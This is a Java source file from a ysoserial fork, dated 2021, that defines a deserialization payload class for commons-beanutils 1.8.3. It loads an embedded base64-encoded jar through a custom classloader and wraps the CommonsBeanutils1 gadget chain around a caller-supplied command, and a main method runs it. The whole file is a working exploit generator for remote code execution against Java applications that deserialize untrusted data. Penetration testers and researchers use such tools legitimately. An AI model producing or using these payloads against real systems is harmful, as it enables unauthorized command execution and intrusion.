package ysoserial.payloads;

import sun.misc.BASE64Decoder;
import ysoserial.payloads.util.*;

import java.io.InputStream;
import java.lang.reflect.Method;

/**
 * created by 0x22cb7139 on 2021/7/9
 */

public class CommonsBeanutils1_183 implements ObjectPayload<Object>{
    public Object getObject(final String command) throws Exception {
        SuidClassLoader suidClassLoader = new SuidClassLoader();
        suidClassLoader.addClass(CommonsBeanutils1.class.getName(), ClassFiles.classAsBytes(CommonsBeanutils1.class));
        InputStream inputStream = CommonsBeanutils1_183.class.getClassLoader().getResourceAsStream("commons-beanutils-1.8.3.txt");
        byte[] jarBytes = new BASE64Decoder().decodeBuffer(TransforBytes.readStringFromInputStream(inputStream));
        suidClassLoader.addJar(jarBytes);
        Class clsGadget = suidClassLoader.loadClass("ysoserial.payloads.CommonsBeanutils1");
        Object objGadget = clsGadget.newInstance();
        Method getObject = objGadget.getClass().getDeclaredMethod("getObject",String.class);
        Object objPayload = getObject.invoke(objGadget,command);
        suidClassLoader.cleanLoader();
        return objPayload;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsBeanutils1_183.class, args);
    }
}
